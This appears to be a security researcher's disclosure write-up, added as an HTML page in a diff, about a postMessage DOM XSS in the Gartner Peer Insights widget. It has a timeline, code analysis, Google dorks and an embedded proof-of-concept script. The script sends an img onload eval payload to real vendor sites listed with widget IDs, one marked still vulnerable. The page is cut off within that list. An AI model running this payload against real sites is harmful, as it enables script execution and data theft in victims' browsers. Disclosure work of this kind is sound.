@@ -1,0 +1,1421 @@
+<html lang="en">
+
+<!--
+    This is a document that describes a DOM XSS vulnerability in the Gartner Peer Insights widget.
+    It is intended to be viewed in a web browser where the domain name contains the string "gartner.com"
+    (e.g. "gartner.com.writeup.example")
+
+    A copy of this document is hosted at https://gartner.com.ring0.lol/
+-->
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="referrer" content="never">
+    <meta name="referrer" content="no-referrer">
+    <title>Gartner Peer Insights widget - postMessage DOM XSS vulnerability</title>
+
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
+
+    <!-- Gallery -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.8.2/css/lightbox.min.css" integrity="sha512-39cUEe00wnlnuDLBvI4rVDbzYOXdLiAo/CVCjRmVWGQ/arXeqYoC8M1Gj1K3UeX4ZtrsvnjKqOGLq6hGNYDgLQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <style>
+        .photo-gallery {
+            color:#313437;
+            background-color:#fff;
+        }
+
+        .photo-gallery p {
+            color:#7d8285;
+        }
+
+        .photo-gallery h2 {
+            font-weight:bold;
+            margin-bottom:40px;
+            padding-top:40px;
+            color:inherit;
+        }
+
+        @media (max-width:767px) {
+            .photo-gallery h2 {
+                margin-bottom:25px;
+                padding-top:25px;
+                font-size:24px;
+            }
+        }
+
+        .photo-gallery .photos {
+            padding-bottom:20px;
+        }
+
+        .photo-gallery .item {
+            padding-bottom:30px;
+        }
+    </style>
+
+    <!-- Highlight -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/default.min.css" integrity="sha512-hasIneQUHlh06VNBe7f6ZcHmeRTLIaQWFd43YriJ0UND19bvYRauxthDg8E4eVNPm9bRUhr5JGeqH7FRFXQu5g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+    <!--[if lt IE 9]>
+    <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+    <![endif]-->
+</head>
+<body>
+
+<div class="container">
+    <div class="pb-2 mt-4 mb-2 border-bottom">
+        <h1>postMessage DOM XSS vulnerability in Gartner Peer Insights widget</h1>
+        <p class="h5">
+            <a href="https://twitter.com/justinsteven">Justin Steven</a>
+        </p>
+    </div>
+    <div class="alert alert-warning" role="alert">
+        <strong>Important:</strong> This website is <strong>not affiliated</strong> with Gartner. If you are looking for the Gartner website, go to <a href="https://www.gartner.com">www.gartner.com</a>
+    </div>
+    <p>
+        This document discusses the <a href="https://blogs.gartner.com/reviews-pages/widget-user-guide/">Gartner Peer Insights Widget</a> and a vulnerability in it that made many websites vulnerable to DOM XSS via <code>Window.postMessage()</code>.
+    </p>
+    <p>
+        The bug can be shown to have affected <strong>Black Kite, Gradle, LogRhythm, ReversingLabs, SentinelOne, Synopsys, Tata Communications, Veeam, Vodafone</strong> and more.
+    </p>
+    <h2>The Story</h2>
+    <p>
+        This is a story about the analysis, exploitation and reporting of a third-party DOM XSS vulnerability.
+    <ol>
+        <li>Setting the Scene</li>
+        <li>Introduction to the Gartner Peer Insights widget</li>
+        <li>
+            Details of a DOM XSS Vulnerability in the Gartner Peer Insights widget, which could be exploited from any website whose domain name contained the string "gartner.com" (e.g. https://gartner.com.attacker.com)
+            <ul>
+                <li>Description and analysis of the issue</li>
+                <li>Proof of Concept</li>
+                <li>Gallery of some affected sites</li>
+                <li>Case study</li>
+                <li>My suggested fix</li>
+            </ul>
+        </li>
+        <li>
+            Analysis of Gartner's tactical fix (19 December 2022) which ensured that only *.gartner.com, or an XSS therein, could exploit the issue
+        </li>
+        <li>
+            Analysis of Gartner's attempted strategic fix (12 January 2023) which further locked down the origins that can send messages, made the message handler one-shot, and implemented sanitisation to protect against the DOM XSS
+            <ul>
+                <li>Bypass of the one-shot handler using race technique</li>
+                <li>Analysis of the improved postMessage origin restrictions</li>
+                <li>Analysis and bypass of the <code>_validateNumber()</code> sanitisation</li>
+                <li>Analysis and bypass of the <code>_validateString()</code> sanitisation</li>
+            </ul>
+        </li>
+        <li>
+            Analysis of Gartner's final fixes (26 January 2023 and 2 Feb 2023) which seems to successfully sanitise away the XSS issue
+        </li>
+        <li>
+            Closing thoughts
+        </li>
+    </ol>
+    <h2>Chapter One - Setting the Scene</h2>
+    <h3>Data flows</h3>
+    <p>
+        This section describes the key data flows that are discussed in this document.
+    </p>
+    <p>
+        Importantly, during the course of my analysis and assessment, no malicious traffic was sent to gartner.com servers or to the servers of companies that consume the Gartner Peer Insights Widget.
+    </p>
+    <p>
+        The ordinary (happy path) data flow of the Gartner Peer Insights Widget is as follows:
+    </p>
+    <p>
+        <img src="images/gartner_data_flow_happy_path.png" class="img-fluid mx-auto d-block" alt="Ordinary data flow for the Gartner Peer Insights widget">
+    </p>
+    <p>
+        That is to say, when a webpage is a consumer of the Gartner Peer Insights Widget, it sources <code>widget.js</code> from gartner.com. The widget code then creates an event listener for postMessage messages, creates a div for the widget to be displayed in, and creates an invisible iframe pointed at gartner.com. The iframe requests a specific page from gartner.com, which sends a postMessage message to the parent page, which in turn uses the message data to populate the widget div.
+    </p>
+    <p>
+        Switching to the attack discussed in this document, the data flow is as follows:
+    </p>
+    <p>
+        <img src="images/gartner_data_flow_attack.png" class="img-fluid mx-auto d-block" alt="Attack data flow for the Gartner Peer Insights widget">
+    </p>
+    <p>
+        The attacking website opens the victim website in a popup window, and then sends a postMessage message to the opened window. This causes malicious active content to be rendered to the widget div, achieving XSS.
+    </p>
+    <p>
+        The attack does not involve sending malicious traffic to victim.com or gartner.com. It executes client-side within the victim user's browser windows.
+    </p>
+    <h3>Disclosure Timeline</h3>
+    <ul>
+        <li>
+            May 2018 - <a href="https://web.archive.org/web/20180505090536/https://www.gartner.com/reviews/public/Widget/js/widget.js">First listing in archive.org of https://www.gartner.com/reviews/public/Widget/js/widget.js</a>
+            <ul>
+                <li>
+                    Though the code is slightly different from the code I analysed in 2022, it appears to have been vulnerable to the DOM XSS issue from its inception
+                </li>
+            </ul>
+        </li>
+        <li>
+            4 November 2022 - I provided an initial draft of this document to Gartner and set a planned publication date of 2 February 2023
+            <ul>
+                <li>
+                    The document discussed the flaw in the restriction of origins which can send postMessage messages to the widget event handler, and demonstrated that a website that can do so (i.e. any website where the domain name contains the string "gartner.com") can trigger DOM XSS in any consumer of the Gartner Peer Insights widget
+                </li>
+                <li>
+                    It suggested that Gartner should:
+                    <ul>
+                        <li>
+                            Fix the faulty logic which controls the sites that can send a postMessage message to the widget event handler, properly restricting the capability to those websites which need to do so; and
+                        </li>
+                        <li>
+                            Consider refactoring the logic of the widget so that even a blessed origin can only provide data to the widget, and cannot trigger a DOM XSS. This would protect against the case in which an XSS in a blessed origin (such as www.gartner.com) is used in a vulnerability chain, ultimately triggering XSS in the consumer of the widget.
+
+                        </li>
+                    </ul>
+                </li>
+            </ul>
+        </li>
+        <li>
+            8 November 2022 - Gartner acknowledged the submission and asked if I would like to submit the issue to their private bug bounty program
+        </li>
+        <li>
+            8 November 2022 - I agreed to be invited to the program and asked if submitting the issue there would preclude me from disclosing the issue publicly
+        </li>
+        <li>
+            19 December 2022 - Gartner published a tactical fix which they said is not intended to be a final fix, and gave an update regarding their private bug bounty program
+            <ul>
+                <li>
+                    The fix prevented exploitation from any website on the Internet, only allowing exploitation of the DOM XSS from JavaScript running in the *.gartner.com origin
+                </li>
+                <li>
+                    The fix did not change the way in which widget data was unsafely rendered, meaning the vulnerability could still be exploited by chaining through an XSS in *.gartner.com
+                </li>
+                <li>
+                    Gartner said they "connected with [their] Customer Success Manager at HackerOne back in November" and they "understand that [their] program should be defaulted to a Singular Disclosure setting (https://docs.hackerone.com/programs/disclosure.html), where [a submitter] can request approval for publishing the contents of the report"
+                    <ul>
+                        <li>
+                            This seems to me as though it would make the publication visible only to other participants of the private program
+                        </li>
+                    </ul>
+                </li>
+            </ul>
+        </li>
+        <li>
+            19 December 2022 - I clarified that I don't want to publish my work on the HackerOne platform, but as a public advisory
+        </li>
+        <li>
+            6 January 2023 - Gartner said they are internally discussing my "publishing ask"
+        </li>
+        <li>
+            14 January 2023 - Gartner said that they have published a "complete repair, provided there is no outstanding vulnerability that can still be demonstrated"
+            <ul>
+                <li>
+                    The fix further restricts the origins which can send postMessage messages, limiting it to four explicit sites within *.gartner.com
+                </li>
+                <li>
+                    The fix causes the postMessage handler to only accept one message, after which it is deregistered
+                </li>
+                <li>
+                    The fix also adds filtering to the content that is received from a postMessage message, with the intention of eliminating XSS payloads before they are rendered within the widget
+                </li>
+            </ul>
+        </li>
+        <li>
+            14 January 2023 - I provided Gartner with several bypasses for the patch. This analysis is described below. I also reminded them that I'm still waiting to hear if they can provide a reward for the work while still allowing me to publicly disclose the issue.
+        </li>
+        <li>
+            21 January 2023 - Gartner confirmed that they would not offer a bug bounty reward if I publicly disclose the issue. This is the last email I'd receive from Gartner.
+        </li>
+        <li>
+            21 January 2023 - I declined the offer of a bug bounty reward.
+        </li>
+        <li>
+            26 January 2023, 2 February 2023 - Gartner published final patches which improve the sanitisation.
+        </li>
+        <li>
+            3 February 2023 - Public disclosure
+        </li>
+    </ul>
+    <h3>Private Bug Bounty Program</h3>
+    <p>
+        After receiving my report and disclosure plan, Gartner asked if I wanted to submit the issue to their private bug bounty program. I asked if doing so would preclude me from being able to publicly disclose the issue. After quite some time, and after I reviewed their patch and gave them detailed notes on how it could be bypassed, they confirmed that <strong>"as an organization, we do not award bounties for findings publicly disclosed outside the HackerOne program."</strong>
+    </p>
+    <p>
+        When I initially submitted my report and set a disclosure timeline, I didn't ask for a reward and I wasn't expecting one (but being offered one would have been a nice surprise!). Once I've already expressed an intention to publicly disclose an issue, I don't feel comfortable taking money to cancel it - I expand on this in the "Closing Thoughts" section below.
+    </p>
+    <p>
+        If any of <strong>Allgress, Apps4.pro, Black Kite, Board International, CloverDX, Deep Instinct, DTEX, Firesec, Gradle, Ironscales, Logpoint, LogRhythm, Matrix42, Openly, Retarus, ReversingLabs, SentinelOne, Service Express, Siemens MindSphere, Synopsys, Tata Communications, Trinamix, Veeam, Vodafone</strong> or <strong>Wrike</strong> are reading this and would like to retroactively recognise me for the work, please get in touch :) my DMs are open on <a href="https://twitter.com/justinsteven">Twitter</a> and <a href="https://infosec.exchange/@justinsteven">Mastodon</a>
+    </p>
+    <h2>Chapter Two - What is the Gartner Peer Insights Widget?</h2>
+    <p>
+        The Gartner Peer Insights Widget is a tile of information that vendors can place on their website. It shows the average rating given to them by their customers, it can show customer reviews, and it prompts the viewer to leave their own review of the vendor.
+    </p>
+    <p>
+        Examples of the Widget can be seen at <a href="https://blogs.gartner.com/reviews-pages/widget-user-guide/">Gartner's Peer Insights Widget webpage</a>:
+    </p>
+    <p>
+        <img src="images/gartner_widget_examples.png" class="img-fluid mx-auto d-block" alt="Examples of the Gartner Peer Insights Widget">
+    </p>
+    <p>
+        The Widget is <a href="https://blogs.gartner.com/reviews-pages/widget-user-guide/#integrate">installed on a website</a> by:
+    </p>
+    <ol>
+        <li>Doing <code>&lt;script src="<a href="https://www.gartner.com/reviews/public/Widget/js/widget.js">"https://www.gartner.com/reviews/public/Widget/js/widget.js"</a>&gt;</code>; then</li>
+        <li>Calling the <code>GartnerPI_Widget()</code> function to instantiate the widget</li>
+    </ol>
+    <h4>Google Dorks</h4>
+    <p>
+        The following search terms might be useful for finding websites that incorporate the Gartner Peer Insights Widget.
+    </p>
+    <ul>
+        <li>"on gartner peer insights" "write a review" -site:gartner.com</li>
+        <li>"submit a review" "as of" "reviewed" "read more"</li>
+        <li>"ratings" "submit a review" "read more" "gartner"</li>
+    </ul>
+    <h2>Chapter Three - Gartner Peer Insights Widget DOM XSS Vulnerability (2018 - 19 December 2022)</h2>
+    <p>
+        The presence of the Gartner Peer Insights widget on a vendor's website made it vulnerable to DOM-based Cross Site Scripting (XSS).
+    </p>
+    <p>
+        Recall the ordinary data flow for the widget:
+    </p>
+    <p>
+        <img src="images/gartner_data_flow_happy_path.png" class="img-fluid mx-auto d-block" alt="Ordinary data flow for the Gartner Peer Insights widget">
+    </p>
+    <p>
+        In step 7, where the hidden iframe pointed at gartner.com does a postMessage to the website's message handler, the handler attempted to ensure that the message came from a gartner.com website. It did this by checking to see that the string "gartner.com" appeared anywhere in the origin of the sending website. This could by bypassed by hosting an attack from a website such as https://gartner.com.attacker.com.
+    </p>
+    <p>
+        Upon receiving a postMessage message that met the "gartner.com" substring criteria, the widget code would take values from the message and would use them to construct HTML. It would then inject the HTML into the widget's content div using the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML">innerHTML</a> property.
+    </p>
+    <p>
+        <code>innerHTML</code> is a DOM XSS "sink". A <code>&lt;script&gt;</code> tag injected into a document using <code>innerHTML</code> will not fire, but other XSS triggers such as <code>&lt;img src=x onerror=alert(1)&gt;</code> will. It's generally unsafe to set <code>innerHTML</code> using attacker-contolled data, and doing so often leads to DOM XSS.
+    </p>
+    <p>
+        If a victim user navigated to a malicious website, then the malicious website could have opened the vendor's website in a popup window and sent it a crafted message using <code>window.postMessage()</code>. This crafted message could have injected active content, executing arbitrary JavaScript in the context of the website. This could have allowed the malicious website to violate the confidentiality and integrity of user data held in the context of the victim site, and allowed it to display arbitrary and harmful content such as a phishing form.
+    </p>
+    <p>
+        Gartner issued patches to resolve the vulnerability. The patches are discussed below.
+    </p>
+    <h3>Analysis of the vulnerability</h3>
+    <p>
+        Once the <a href="https://www.gartner.com/reviews/public/Widget/js/widget.js">Peer Insights Widget code</a> (<a href="https://web.archive.org/web/20220930160732/https://www.gartner.com/reviews/public/Widget/js/widget.js">Archive.org copy from September 2022</a>) was sourced on a website, and a Widget had been instantiated, a message handler would have been registered thusly:
+    </p>
+    <pre><code class="language-js">l = function () {
+  window.addEventListener('message', o, !1)
+},</code></pre>
+    <p>
+        Upon receiving a cross-site postMessage, the handler would execute the <code>o()</code> function as follows:
+    </p>
+    <pre><code class="language-js">o = function (e) {
+  e.origin.indexOf('gartner.com') > - 1 && y(e.data)
+},</code></pre>
+    <p>
+        This function is checking that the string "gartner.com" appears anywhere in the origin of the website that sent the cross-site message, and if so it proceeds to handle the message data using the <code>y()</code> function.
+    </p>
+    <p>
+        An <a href="https://developer.mozilla.org/en-US/docs/Glossary/Origin">origin</a> is the combination of the protocol, domain name and port of the sending website (e.g. https://www.example.com:8443)
+    </p>
+    <p>
+        Note that the <code>o()</code> function is not checking that the domain name of the website is exactly "gartner.com", or that it ends with "gartner.com". If the string "gartner.com" appears anywhere in the sending website's origin, processing of the message will continue. Thus, a website such as https://gartner.com.attacker.com could have triggered the logic being discussed.
+    </p>
+    <p>
+        <code>y()</code> was given by:
+    </p>
+    <pre style="white-space: pre-wrap"><code class="language-js">y = function (e) {
+  (e = 'object' != typeof e ? JSON.parse(e) : null) && e.widgetId && e.widgetId === t.widget_id && (e && e.error ? t.dataContainer.appendChild(f()) : null !== e && t.dataContainer && ('line' === t.size ? L(e) : 'large' === t.size ? (A(e), e.vendor && v(e.vendor.url, e.vendor.seoName), e.reviews && e.reviews.length && (self.animateId = setTimeout(u, 10000))) : _(e)))
+},</code></pre>
+    <p>
+        This code:
+    </p>
+    <ol>
+        <li>Ensures that the message data (<code>e</code>) is not an object, and then JSON decodes it.</li>
+        <li>Ensures that <code>e</code> has a "widgetId" attribute and that the widgetId matches the widget_id attribute of <code>t</code> (which seems to be the Widget that the vendor has instantiated on their website)</li>
+        <li>If the message contains an "error" value, display some error condition in <code>t</code>'s dataContainer</li>
+        <li>Ensures that <code>t</code> has a "dataContainer" attribute</li>
+        <li>
+            If:
+            <ol type="i">
+                <li><code>t</code>'s "size" is "line" then do <code>L(e)</code>; else</li>
+                <li>If <code>t</code>'s "size" is "large" then do <code>A(e)</code> and if <code>e</code> has a "vendor" attribute then do <code>v(e.vendor.url, e.vendor.seoName)</code> and if <code>e</code> has a "reviews" attribute and the "reviews" attribute has a truthy "length" attribute then do <code>u()</code> in 10 seconds; else</li>
+                <li>Do <code>_(e)</code></li>
+            </ol>
+        </li>
+    </ol>
+    <p>
+        Each of the three branches in step 5 ran one of <code>L()</code>, <code>A()</code> or <code>_()</code>. These functions (and their relevant dependencies) were implemented as follows:
+    </p>
+    <pre class="pre-scrollable" style="max-height: 75vh"><code class="language-js">L = function (e) {
+  var i = [
+  ],
+  n = e.rating,
+  r = e.reviewCount;
+  i.push('&lt;div class="gartner-pi-card"&gt;'),
+  i.push('&lt;div class="gartner-pi-stats"&gt;'),
+  i.push('&lt;div class="gartner-pi-overall-rating"&gt;'),
+  i.push('&lt;span class="gartner-pi-score"&gt;' + n + '&lt;/span&gt;'),
+  i.push('&lt;div class="gartner-pi-translate"&gt;'),
+  i.push(k(n)),
+  i.push('&lt;div class="gartner-pi-reviews-link"&gt;'),
+  i.push('&lt;span&gt;' + r + ' Rating' + (r &gt; 1 ? 's' : '') + '&lt;/span&gt;'),
+  i.push(' on Gartner Peer Insights&lt;/div&gt;'),
+  t.sourcingLink && (i.push('&lt;div class="gartner-pi-sourcing-link"&gt;'), i.push('&lt;a id="' + t.sourcingLink + '" href="' + t.sourcingLink + '" target="_blank"&gt;(Submit a review)&lt;/a&gt;'), i.push('&lt;/div&gt;')),
+  i.push('&lt;/div&gt;'),
+  i.push('&lt;/div&gt;'),
+  i.push('&lt;/div&gt;'),
+  i.push('&lt;div class="gartner-pi-as-of-date" title="As of ' + w() + '"&gt;As of ' + w() + '&lt;/div&gt;'),
+  i.push('&lt;/div&gt;'),
+  t.dataContainer.innerHTML = i.join(''),
+  v(e.url, e.seoName)
+}
+
+A = function (e) {
+  var i = e.reviews,
+  n = e.vendor,
+  r = C(n);
+  r.push('&lt;div class="gartner-pi-reviews"&gt;'),
+  r.push('&lt;ul&gt;');
+  for (var s = 0; s &lt; i.length; s++) {
+    var a = i[s];
+    r.push('&lt;li&gt;'),
+    r.push('&lt;div class="gartner-pi-rating-container"&gt;'),
+    r.push(k(a.rating)),
+    r.push('&lt;span class="gartner-pi-datestamp"&gt;'),
+    r.push('Reviewed ' + m(a.date)),
+    r.push('&lt;/span&gt;'),
+    r.push('&lt;/div&gt;'),
+    r.push('&lt;p class="gartner-pi-quote"&gt;"' + a.headline + '..." '),
+    r.push('&lt;span&gt;(read more)&lt;/span&gt;&lt;/p&gt;'),
+    r.push('&lt;/li&gt;')
+  }
+  r.push('&lt;/ul&gt;'),
+  r.push('&lt;/div&gt;'),
+  t.dataContainer.innerHTML = r.join('')
+}
+
+_ = function (e) {
+  var i = C(e);
+  t.dataContainer.innerHTML = i.join(''),
+  v(e.url, e.seoName)
+}
+
+C = function (e) {
+  var i = [
+  ],
+  n = e.rating,
+  r = e.score,
+  s = e.reviewCount,
+  a = e.name,
+  d = e.market;
+  return i.push('&lt;div class="gartner-pi-gradient"&gt;&lt;/div&gt;'),
+  i.push('&lt;div class="gartner-pi-card"&gt;'),
+  i.push('&lt;div class="gartner-pi-logo"&gt;&lt;/div&gt;'),
+  i.push('&lt;div class="gartner-pi-header"&gt;'),
+  i.push('&lt;h1 class="gartner-pi-h1"&gt;' + a + '&lt;/h1&gt;'),
+  i.push('&lt;h2 class="gartner-pi-h2"&gt;' + d + '&lt;/h2&gt;'),
+  i.push('&lt;/div&gt;'),
+  i.push('&lt;div class="gartner-pi-stats"&gt;'),
+  i.push('&lt;div class="gartner-pi-alignLeft"&gt;'),
+  i.push('&lt;div class="gartner-pi-overall-rating"&gt;'),
+  i.push('&lt;span class="gartner-pi-score"&gt;' + n + '&lt;/span&gt;'),
+  i.push(k(n)),
+  i.push('&lt;/div&gt;'),
+  i.push('&lt;div class="gartner-pi-reviews-link"&gt;'),
+  i.push('&lt;span&gt;' + s + ' Rating' + (s &gt; 1 ? 's' : '') + ' '),
+  i.push('&lt;span class="gartner-pi-chevron"&gt;&lt;/span&gt;'),
+  i.push('&lt;/span&gt;'),
+  i.push('&lt;/div&gt;'),
+  i.push('&lt;/div&gt;'),
+  i.push('&lt;div class="gartner-pi-alignRight"&gt;'),
+  t.sourcingLink ? (i.push('&lt;div class="gartner-pi-sourcing-link"&gt;'), i.push('&lt;a id="' + t.sourcingLink + '" href="' + t.sourcingLink + '" target="_blank"&gt;Submit a review&lt;/a&gt;'), i.push('&lt;span class="gartner-pi-chevron"&gt;&lt;/span&gt;'), i.push('&lt;/div&gt;')) : (i.push('&lt;div&gt;'), i.push('&lt;div class="gartner-pi-overall-rating"&gt;'), i.push('&lt;span class="gartner-pi-score"&gt;' + r + '%&lt;/span&gt;'), i.push('&lt;span class="gartner-pi-thumbs-up"&gt;&lt;/span&gt;'), i.push('&lt;div class="gartner-pi-reviews-link"&gt;'), i.push('&lt;span&gt;Recommend&lt;/span&gt;'), i.push('&lt;/div&gt;'), i.push('&lt;/div&gt;'), i.push('&lt;/div&gt;')),
+  i.push('&lt;/div&gt;'),
+  i.push('&lt;div class="gartner-pi-as-of-date" title="As of ' + w() + '"&gt;As of ' + w() + '&lt;/div&gt;'),
+  i.push('&lt;/div&gt;'),
+  i.push('&lt;/div&gt;'),
+  i
+}</code></pre>
+    <p>
+        These three functions essentially constructed a wad of HTML using various values taken from <code>e</code> (i.e. the message that was posted cross-site) and then set <code>t.dataContainer.innerHTML</code> to the constructed HTML. This gave rise to the DOM-based XSS vulnerability. If particular values of <code>e</code> contained active HTML content, setting the page's Widget's dataContainer's innerHTML to a value constructed based on these values would have allowed the external website to execute JavaScript in the context of the vendor's website.
+    </p>
+    <p>
+        Among other values, the attributes <code>rating</code> and <code>vendor.rating</code> were always used in the construction of the HTML wad. If an <code>e</code> had contained both of them and placed malicious HTML content in each of them, the malicious HTML content would have make it onto the vendor's webpage regardless of whether their <code>t</code>'s size attribute is "line", "large" or other.
+    </p>
+    <p>
+        In addition to these attributes, a successful attack should have included an empty array attribute named "reviews" to satisfy a loop that the large widget tried to do.
+    </p>
+    <h3>Proof of Concept</h3>
+    <p>
+        The following form implements the above DOM XSS attack against a non-exhaustive handful of websites that include and instantiate the Gartner Peer Insights Widget. Note that the patches by Gartner (discussed below) have resolved the issue for most of the sites, and so sites that are no longer affected are disabled in the drop-down.
+    </p>
+    <p>
+        Pick a target from the drop-down list (or set a custom URL and Widget ID using the text fields), set a JavaScript payload, and click Submit. The target website will open in a popup window and will have the JavaScript payload executed within.
+    </p>
+    <p>
+        The "Demo" target exploits <a href="https://justinsteven.github.io/gartnerpeerinsightsxssdemo/demo1.html">https://justinsteven.github.io/gartnerpeerinsightsxssdemo/demo1.html</a> which is an intentionally vulnerable webpage. It executes a vendored copy of the code which was taken prior to 19 December 2022 (i.e. before Gartner patched the issue) allowing you to explore and experiment with the vulnerability.
+    </p>
+    <p>
+        If you'd like to see how the Proof of Concept is implemented, <a href="https://techcrunch.com/2021/10/15/f12-isnt-hacking-missouri-governor-threatens-to-prosecute-local-journalist-for-finding-exposed-state-data/">commit a crime</a> using Right Click &rarr; View Source.
+    </p>
+    <p>
+        This POC will only work if you are viewing this page from a website that contains "gartner.com" somewhere in its origin.
+    </p>
+
+    <form id="pocForm">
+        <div class="form-group">
+            <label for="targetSelect">Target</label>
+            <select class="form-control" id="targetSelect">
+                <option value="Custom">Custom</option>
+            </select>
+        </div>
+        <div class="form-group">
+            <label for="targetURL">Target URL</label>
+            <input type="text" class="form-control" id="targetURL" placeholder="URL">
+        </div>
+        <div class="form-group">
+            <label for="targetWidgetID">Target Widget ID</label>
+            <input type="text" class="form-control" id="targetWidgetID" placeholder="Widget ID">
+        </div>
+        <div class="form-group">
+            <label for="payload">Payload</label>
+            <textarea class="form-control" id="payload" rows="3">alert(document.domain);</textarea>
+        </div>
+        <button type="submit" class="btn btn-primary">Submit</button>
+    </form>
+
+    <p>
+        Note: Payload will repeatedly fire to account for slow-loading pages. You may need to scroll the page for the widget to be lazily loaded before the payload will execute.
+    </p>
+
+    <script>
+        function sendit(target, widgetId, payload) {
+            let badImg = `<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onload="eval(atob('${btoa(payload)}'))">`;
+            target.postMessage(JSON.stringify({
+                "widgetId": widgetId,
+                "reviews": [],
+                "rating": badImg,
+                "vendor": {
+                    "rating": badImg
+                }
+            }), '*');
+            setTimeout(sendit, 3000, target, widgetId, payload);
+        }
+
+        let form = document.getElementById("pocForm");
+
+        let targets = {
+            "Demo": {
+                "url": "https://justinsteven.github.io/gartnerpeerinsightsxssdemo/demo1.html",
+                "wid": "OWMzM2QzN2EtNWUwYS0iRJRJFJFIRDgtNWQ4ZjgyNDIyMmY3"
+            },
+            "DTEX": {
+                "url": "https://www.dtexsystems.com/customers/",
+                "wid": "NTgyZjRkY2QtYjkzYS00M2M5LTg4NDgtOWU5NmIyMzIxMDM3",
+                "comment": "Still vulnerable as of Feb 2023 due to library vendoring"
+            },
+            "Allgress": {
+                "url": "https://allgress.com/",
+                "wid": "NDU3ZDAxNGUtMzIzMy00NTgzLWJmMjYtZTVmYTBiOTJhOGZm",
+                "disabled": true,
+                "comment": "Patched"
+            },
+            "Apps4.pro": {
+                "url": "https://apps4.pro/microsoft-onedrive-migration-tool/",
+                "wid": "YzYzOWFkMjgtOGNjYi00NTllLTg0ZTItMmJiZmU1MWY3YWQ4",
+                "disabled": true,
+                "comment": "Patched"
+            },
+            "Black Kite": {
+                "url": "https://blackkite.com/",
+                "wid": "YzdhOTVlZDEtZGVjZS00NDBhLTgwODUtMWJlNjM1ZGE0NzVj",
+                "disabled": true,
+                "comment": "Patched"
+            },
+            "Board International": {
+                "url": "https://www.board.com/en/finance",
+                "wid": "ZTQwY2EwMDYtOGNiNC00Y2QzLThkNDItYTFkOWIxYzJhNDZh",
+                "disabled": true,
+                "comment": "Patched"
+            },
+            "CloverDX": {
+                "url": "https://www.cloverdx.com/",
+                "wid": "MjZkM2I3N2MtZDllNC00ZDNmLTkxYmUtY2ExYmUxYWZiMzVj",
+                "disabled": true,
+                "comment": "Patched"
+            },
+            "Deep Instinct": {
+                "url": "https://www.deepinstinct.com/",
+                "wid": "MzE4NjczMWItNDI3MS00MzA5LTkwOTEtYWE2MWFhODI0M2Ey",
+                "disabled": true,
+                "comment": "Patched"
+            },
+            "Firesec": {
+                "url": "https://firesec.io/",
+                "wid": "YzkyYzU0ZTYtMWUxYS00NGY1LWE0MzctZWZiMTI1MDllNDdi",
+                "disabled": true,
+                "comment": "Patched"
+            },
+            "Gradle": {
+                "url": "https://gradle.com/enterprise-customers/commercial/",
+                "wid": "MWU0YWQ2OTItN2M1OC00MWU0LTk0OTMtOTU0YzkzN2NiMGZi",
+                "disabled": true,
+                "comment": "Patched"
+            },
+            "Ironscales": {
+                "url": "https://ironscales.com/resources/reviews/gartner-peer-insights/",
+                "wid": "MjRkNzM0NWYtMDU5YS00MjNjLWFmYmEtYWViOTY0MjMzN2M1",
+                "disabled": true,
+                "comment": "Patched"
+            },
+            "Logpoint": {
+                "url": "https://www.logpoint.com/en/customers/gartner-peer-insights/",
+                "wid": "Yzg1MjQ3MzEtNDRkNC00YTRhLWI4M2ItNDg2MWQzODllOGY4",
+                "disabled": true,
+                "comment": "Patched"
+            },
+            "LogRhythm": {
+                "url": "https://logrhythm.com/logrhythm-reviews-gartner-peer-insights/",
+                "wid": "ZTM4MjFjMDktZTFkYS00NGZjLTk3N2EtMTE1ZWEzNjE0MWQ1",
+                "disabled": true,
+                "comment": "Patched"
+            },
+            "Matrix42": {
+                "url": "https://www.matrix42.com/en/digital-workspace-management/secure-unified-endpoint-management/unified-endpoint-management/gartner-magic-quadrant-unified-endpoint-management-tools-2021",
+                "wid": "NzAxZWM0MjYtMmIxYy00OTQ1LTg1YzUtZDQxNTM1OTM2ZWJh",
+                "disabled": true,
+                "comment": "Patched"
+            },
+            "Openly": {
+                "url": "https://openly.com.au/",
+                "wid": "ZmJlNTM4ODYtNjM0NC00MmE2LWEzZGEtZmY2NzI2ZmZlOWE2",
+                "disabled": true,
+                "comment": "Patched"
+            },
+            "Retarus": {
+                "url": "https://www.retarus.com/au/services/email-security/",
+                "wid": "MTA4Yjc1MTYtMmUwYi00MGI5LTg2YTEtODcwNDUxODNkNWM1",
+                "disabled": true,
+                "comment": "Patched"
+            },
+            "ReversingLabs": {
+                "url": "https://www.reversinglabs.com/why-choose-reversinglabs",
+                "wid": "YzZjZWU5YjQtNGRlOS00Y2YxLTgwMWYtZmFiNDBjMjQzNzk4",
+                "disabled": true,
+                "comment": "Patched"
+            },
+            "SentinelOne": {
+                "url": "https://www.sentinelone.com/lp/sentinelone-the-leader-in-gartners-2020-edr-peer-insights/",
+                "wid": "YWYyOTI0NTEtZTAyYi00MzE2LWEzYmUtYWI1NGQ5MjcyMmI3",
+                "disabled": true,
+                "comment": "Patched"
+            },
+            "Service Express": {
+                "url": "https://serviceexpress.com/",
+                "wid": "YjlmMjc1NGEtNThlNy00OTRjLWI2NGMtNTU0OWQyOTRjMjQz",
+                "disabled": true,
+                "comment": "Patched"
+            },
+            "Siemens MindSphere": {
+                "url": "https://siemens.mindsphere.io/en",
+                "wid": "ZjYzNmJkYmMtYTBhOC00MmRkLTllNTEtZmFkZWVlZDk0NDJi",
+                "disabled": true,
+                "comment": "Patched"
+            },
+            "Synopsys": {
+                "url": "https://www.synopsys.com/software-integrity/customers.html",
